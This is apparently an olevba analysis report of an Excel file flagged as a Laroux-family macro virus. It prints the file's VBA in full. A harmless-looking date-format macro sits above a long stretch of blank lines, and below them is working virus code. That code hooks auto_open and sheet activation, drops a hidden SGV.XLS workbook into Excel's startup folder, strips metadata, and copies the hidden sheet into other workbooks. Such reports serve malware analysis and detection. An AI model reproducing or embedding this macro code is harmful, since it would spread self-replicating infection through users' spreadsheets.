olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-14bdd809a4d1d534760cf4de5d03ad96e11ca7c7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SGV.bas 
in file: Virus.MSExcel.Laroux-based-14bdd809a4d1d534760cf4de5d03ad96e11ca7c7 - OLE stream: '_VBA_PROJECT_CUR/VBA/SGV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'
' Insert_Date_Format Macro
' Macro to Insert the Correct Format for the NAB File
'
' Keyboard Shortcut: Ctrl+i
'
Sub Insert_Date_Format()
Attribute Insert_Date_Format.VB_ProcData.VB_Invoke_Func = " \n14"
    Cells.Select
    Cells.EntireColumn.AutoFit
    ActiveWindow.Zoom = 75
    Columns("I:I").Select
    Selection.NumberFormat = "0.00"
    Range("D1").Select
    Selection.EntireColumn.Insert
    Selection.EntireColumn.Insert
    Selection.EntireColumn.Insert
    ActiveCell.FormulaR1C1 = "=+RIGHT(RC[3],2)"
    Range("E1").Select
    ActiveCell.FormulaR1C1 = "=+MID(RC[2],4,2)"
    Range("F1").Select
    ActiveCell.FormulaR1C1 = "=+LEFT(RC[1],2)"
    Range("D1:F1").Select
    Selection.Copy
    Range("D2:D16384").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Selection.End(xlUp).Select
    Columns("D:F").Select
    Selection.Copy
    Range("D1").Select
    Selection.PasteSpecial Paste:=xlValues, Operation:=xlNone, _
        SkipBlanks:=False, Transpose:=False
    Range("D1").Select
    Range("A1").Select
End Sub






































Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "SGV.XLS")
    If m$ = "SGV.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("SGV").Visible = True
    Sheets("SGV").Select
    Sheets("SGV").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "SGV.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("SGV").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "SGV.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "SGV" Then
        Workbooks("SGV.XLS").Sheets("SGV").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("SGV").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "SGV.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  SG
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

